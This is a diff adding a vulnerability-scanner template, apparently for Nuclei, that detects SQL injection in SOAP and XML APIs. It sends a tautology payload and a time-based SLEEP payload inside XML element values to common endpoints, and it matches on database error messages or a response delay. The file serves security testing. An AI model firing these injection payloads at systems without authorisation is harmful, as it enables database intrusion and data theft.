@@ -1,0 +1,66 @@
+id: sqli-xml-input
+
+info:
+  name: SQL Injection via XML Input (SOAP/XML API)
+  author: security-researcher
+  severity: high
+  description: |
+    XML 형식(SOAP, XML API)의 요청에서 SQL 인젝션 취약점을 탐지합니다.
+    XML 요소 값에 SQL 페이로드를 삽입하여 발생합니다.
+  tags: sqli,xml,soap,injection
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api"
+      - "{{BaseURL}}/soap"
+      - "{{BaseURL}}/ws"
+      - "{{BaseURL}}/webservice"
+      - "{{BaseURL}}/service.asmx"
+
+    headers:
+      Content-Type: text/xml; charset=utf-8
+      SOAPAction: "GetUser"
+
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+          <GetUser>
+            <userId>1' OR '1'='1</userId>
+          </GetUser>
+        </soap:Body>
+      </soap:Envelope>
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "you have an error in your sql syntax"
+          - "ORA-\\d{5}"
+          - "Microsoft OLE DB"
+          - "PostgreSQL.*ERROR"
+          - "sql.*error|syntax.*error"
+        condition: or
+        case-insensitive: true
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api"
+      - "{{BaseURL}}/xml"
+
+    headers:
+      Content-Type: application/xml
+
+    body: |
+      <?xml version="1.0"?>
+      <request>
+        <action>getUser</action>
+        <id>1' AND SLEEP(5)--</id>
+      </request>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5000"
